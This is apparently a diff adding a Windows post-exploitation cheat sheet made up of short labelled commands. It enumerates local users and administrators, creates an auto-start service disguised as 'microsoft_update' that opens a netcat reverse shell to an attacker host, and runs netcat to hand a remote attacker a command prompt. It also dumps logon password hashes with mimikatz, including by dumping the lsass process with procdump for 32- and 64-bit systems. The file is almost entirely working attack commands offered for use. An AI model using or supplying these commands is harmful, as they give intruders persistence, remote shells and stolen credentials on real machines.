@@ -1,0 +1,25 @@
+Dump users and administrator groups
+net localgroup Users
+net localgroup Administrators
+
+Find all word files in any directory
+dir/s *.doc
+
+Create a service that auto-runs netcat and opens a shell
+sc create microsoft_update binpath=”cmd /K start c:\nc.exe -d <AttackerIP> <AttackerPort> -e cmd.exe” start= auto error= ignore
+
+Start netcat and pass remote attackers input to a local CMD on your machine
+nc.exe -e c:\windows\system32\cmd.exe -vv <AttackerIP> <AttackerPort>
+
+Get a dump of windows logon password hashes.
+mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”
+
+You can also get a dump of windows passwords by creating a dump of lsass and then running that dump through mimkatz
+Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz.exe “sekurlsa::minidump lsass.dmp” “log” “sekurlsa::logonpasswords”
+
+Remember when taking the dump, alter it for 32 or 64bit environments
+For 32 bits
+C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 
+For 64 bits
+C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp
